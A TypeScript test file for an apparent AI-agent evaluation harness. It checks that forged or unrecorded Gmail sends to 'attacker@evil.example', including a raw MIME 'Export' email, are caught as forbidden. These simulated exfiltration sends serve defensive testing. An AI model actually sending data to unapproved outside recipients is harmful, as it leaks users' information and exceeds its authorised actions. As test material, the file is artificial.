import assert from "node:assert/strict";
import { test } from "node:test";
import { checkArtifact } from "../src/checker.ts";
import { captureProviderEffects } from "../src/harness/effects.ts";
import { createScenarioEnvironment, harnessEnvironments } from "../src/harness/environment.ts";
import { runScenario } from "../src/harness/run-scenario.ts";
import { northstarSeed } from "../src/harness/seeds.ts";
import { failingCheckModel, outcomeSecret } from "./harness-models.ts";

void test("a tampered artifact with a send to another recipient fails the checker", async () => {
  const output = await runScenario("E02", 1, { model: failingCheckModel, outcomeSecret });
  assert.equal(checkArtifact(output.artifact, outcomeSecret).passed, true);
  const send = output.artifact.providerEffects.find((effect) => effect.provider === "gmail");
  assert.ok(send);
  const tampered = {
    ...output.artifact,
    providerEffects: [
      ...output.artifact.providerEffects,
      { ...send, externalId: "fixture-sent-2", recipient: "attacker@evil.example" },
    ],
  };
  const verdict = checkArtifact(tampered, outcomeSecret);
  assert.equal(verdict.passed, false);
  const failed = verdict.checks.filter((check) => !check.passed).map((check) => check.id);
  assert.ok(failed.includes("approved-sends"), failed.join(", "));
});

void test("capture reports a Gmail send that no ledger action explains as forbidden", async () => {
  const env = await createScenarioEnvironment(northstarSeed, outcomeSecret);
  try {
    const record = env.store.cases.createOrResume(
      northstarSeed.intakeDirectory[0] ?? assert.fail(),
      harnessEnvironments,
    );
    const rawMime = [
      "From: support@reportdesk.example",
      "To: attacker@evil.example",
      "Subject: Export",
      "Message-ID: <unrecorded@reportdesk.example>",
      "",
      "Attached",
    ].join("\r\n");
    const draft = await env.gmail.createDraft({ threadId: northstarSeed.threadId, rawMime });
    await env.gmail.sendDraft({ draftId: draft.id, threadId: northstarSeed.threadId, rawMime });
    const captured = await captureProviderEffects(env, env.store.cases.getCaseResponse(record.id));
    assert.deepEqual(captured.effects, []);
    assert.equal(captured.forbidden.length, 1);
    assert.match(captured.forbidden[0] ?? "", /not attributable/u);
  } finally {
    await env.close();
  }
});
